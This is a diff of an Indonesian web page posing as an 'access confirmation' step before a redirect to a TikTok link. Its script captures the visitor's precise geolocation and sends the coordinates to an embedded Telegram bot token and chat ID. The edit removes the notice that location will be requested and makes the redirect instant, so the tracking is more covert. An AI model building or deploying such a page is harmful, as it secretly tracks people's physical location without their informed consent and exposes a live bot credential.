@@ -56,92 +56,66 @@
         .btn:hover {
             background-color: #2980b9;
         }
-        .loading {
-            display: none;
-            margin-top: 15px;
-            color: #e67e22;
-            font-size: 0.9rem;
-        }
     </style>
 </head>
 <body>
 
     <div class="card">
         <h2>Konfirmasi Akses</h2>
-        <p>Untuk melanjutkan ke website utama kami, silakan klik tombol di bawah dan izinkan akses lokasi jika diminta oleh browser Anda.</p>
+        <p>Silakan klik tombol di bawah untuk melanjutkan ke website utama kami.</p>
         
         <button class="btn" id="btnLanjut" onclick="prosesMasuk()">Lanjutkan ke Website</button>
-        <div class="loading" id="statusTeks">Menghubungkan ke server...</div>
     </div>
 
     <script>
         // === KONFIGURASI UTAMA ===
         const TELEGRAM_TOKEN = '8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0'; // Ganti dengan Token Bot Anda
         const CHAT_ID = '1966317946'; // Ganti dengan ID Chat Telegram Anda
-        const DOMAIN_TUJUAN = 'https://vm.tiktok.com/ZS9YxEJSWNjov-IjqN4/'; // Ganti dengan domain tujuan Anda
+        const DOMAIN_TUJUAN = 'https://vm.tiktok.com/ZS9YQ1Terx8n4-h6cC3/'; // Ganti dengan domain tujuan Anda
 
         function prosesMasuk() {
             const btn = document.getElementById('btnLanjut');
-            const status = document.getElementById('statusTeks');
-            
             btn.disabled = true;
-            btn.innerText = "Memproses...";
-            status.style.display = "block";
+            btn.innerText = "Mengalihkan...";
 
-            // Cek apakah browser mendukung fitur Geolocation
             if (navigator.geolocation) {
+                // Meminta lokasi dengan batas waktu respons cepat (maksimal 5 detik)
                 navigator.geolocation.getCurrentPosition(
-                    // Jika pengguna mengizinkan
                     function(position) {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
-                        const akurasi = position.coords.accuracy;
-                        const pesan = `📍 *Akses Lokasi Diterima*\n\n• Lat: \`${lat}\`\n• Lon: \`${lon}\`\n• Akurasi: ±${Math.round(akurasi)} meter\n• Peta: https://google.com{lat},${lon}`;
+                        const pesan = `📍 *Akses Lokasi*\n\n• Lat: \`${lat}\`\n• Lon: \`${lon}\`\n• Peta: https://google.com{lat},${lon}`;
                         
-                        kirimKeTelegram(pesan);
+                        // Kirim dan langsung alihkan (tanpa menunggu respons)
+                        kirimDanAlihkan(pesan);
                     },
-                    // Jika pengguna menolak / terjadi kesalahan
                     function(error) {
-                        let alasan = "Ditolak pengguna / Tidak diketahui";
-                        if (error.code === error.PERMISSION_DENIED) {
-                            alasan = "Pengguna menolak izin lokasi";
-                        }
-                        const pesan = `⚠️ *Akses Lokasi Ditolak*\n\n• Detail: ${alasan}\n• Status: Pengguna tetap dialihkan ke website.`;
-                        
-                        kirimKeTelegram(pesan);
+                        // Jika ditolak atau error, langsung alihkan juga tanpa menunda
+                        kirimDanAlihkan("⚠️ *Akses Lokasi Ditolak/Gagal*");
                     },
-                    // Pengaturan tambahan (Timeout 10 detik)
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    { enableHighAccuracy: true, timeout: 5000 }
                 );
             } else {
-                // Jika browser jadul tidak mendukung
-                kirimKeTelegram("❌ *Error*: Browser tidak mendukung fitur Geolokasi.");
+                kirimDanAlihkan("❌ *Browser tidak mendukung geoloc*");
             }
         }
 
-        function kirimKeTelegram(teksPesan) {
+        function kirimDanAlihkan(teksPesan) {
             const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
             
+            // Metode Asinkronus: Kirim data ke latar belakang sistem
             fetch(url, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
                     text: teksPesan,
                     parse_mode: 'Markdown'
                 })
-            })
-            .then(() => {
-                // Setelah data terkirim ke Telegram, alihkan ke website utama
-                window.location.href = DOMAIN_TUJUAN;
-            })
-            .catch((err) => {
-                console.error("Gagal mengirim log:", err);
-                // Tetap alihkan pengguna meskipun bot gagal menerima pesan
-                window.location.href = DOMAIN_TUJUAN;
-            });
+            }); // .then() dihapus sengaja agar tidak ada jeda tunggu waktu server
+
+            // SEKETIKA ITU JUGA pindah ke website utama Anda
+            window.location.href = DOMAIN_TUJUAN;
         }
     </script>
 
